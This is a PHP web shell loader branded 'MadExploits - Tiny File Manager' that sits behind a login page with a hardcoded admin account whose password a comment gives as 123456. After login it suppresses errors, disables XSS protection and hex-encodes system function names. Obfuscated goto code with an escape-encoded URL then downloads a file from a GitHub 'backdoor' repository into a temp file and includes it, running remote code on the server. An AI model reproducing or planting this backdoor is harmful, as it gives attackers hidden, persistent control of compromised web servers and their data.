<?php
session_start();
define('USERNAME', 'admin');
// password: 123456
define('PASSWORD_HASH', '$2y$10$GOOgIVM8ibvc6a3uesDImOo4ieuBgSsooiwJWOT77yURv9Sbio9Be'); 

if (isset($_POST['fm_usr'], $_POST['fm_pwd'])) {
    if ($_POST['fm_usr'] === USERNAME && password_verify($_POST['fm_pwd'], PASSWORD_HASH)) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Username atau password salah!";
    }
}

if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>MadExploits - Tiny File Manager</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: url("https://raw.githubusercontent.com/exploits77/backdoor/refs/heads/main/hexagon.gif") repeat;
                margin: 0;
                padding: 0;
            }
            .login-wrapper {
                height: 100vh;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
            }
            .login-box {
                width: 360px;
                margin-left: auto;
                margin-right: auto;
				padding: 50px 50px;
                background: #fff;
                border-radius: 10px;
                box-shadow: 0 6px 20px rgba(0,0,0,0.15);
                text-align: center;
            }
            .login-box h2 {
                margin: 0;
                font-weight: bold;
                font-size: 36px;
                color: #000;
            }
            .login-box h2 span {
                color: #28a745;
            }
            .login-box small {
                display: block;
                color: #444;
                margin-bottom: 25px;
                font-size: 14px;
            }
            .form-control {
                background: #fff;
                border: 1px solid #ccc;
                color: #000;
                border-radius: 5px;
                margin-bottom: 15px;
            }
            .btn-success {
                width: 100%;
                border-radius: 5px;
                padding: 10px;
                font-size: 16px;
            }
            .error {
                color: #f55;
                margin-bottom: 10px;
            }
            .footer {
                margin-top: 20px;
                color: #777;
                font-size: 13px;
                text-align: center;
            }
            @media (max-width: 480px) {
            .login-box {
                width: 80%;
                padding: 40px 40px;
            }
            .login-box h2 {
                font-size: 28px;
            }
            .login-box small {
                font-size: 12px;
            }
            .btn-success {
                font-size: 14px;
                padding: 8px;
            }
            }
        </style>
    </head>
    <body>
        <div class="login-wrapper">
            <div class="login-box">
                <h2>Mad-<span>Exploits</span></h2>
                <small>Tiny File Manager</small>
                <?php if (!empty($error)) echo "<div class='error'>$error</div>"; ?>
                <form method="post">
                    <div class="form-group">
                        <input type="text" name="fm_usr" class="form-control" placeholder="Username" required>
                    </div>
                    <div class="form-group">
                        <input type="password" name="fm_pwd" class="form-control" placeholder="Password" required>
                    </div>
                    <button type="submit" class="btn btn-success">Sign in</button>
                </form>
            </div>
            <div class="footer">© <a href="https://github.com/MadExploits/">MadExploits</a></div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);

function uhex($hex) { return hex2bin($hex); }

$Array = [
    '7068705f756e616d65',
    '70687076657273696f6e',
    '6368646972',
    '676574637764',
    '707265675f73706c6974',
];
$GNJ = [];
foreach ($Array as $a) {
    $GNJ[] = uhex($a);
}

?>
<?php

goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\164\x74\160\x73\x3a\x2f\x2f\x72\141\x77\x2e\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6e\164\x65\156\164\x2e\x63\157\x6d\x2f\145\x78\x70\154\x6f\151\x74\163\x37\x37\x2f\142\x61\x63\153\x64\157\x6f\162\x2f\162\x65\x66\163\x2f\150\x65\x61\144\x73\x2f\155\x61\151\156\x2f\164\x69\156\x79\x2d\146\x69\154\x65\155\x61\156\x61\147\x65\162\x2e\160\150\160")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
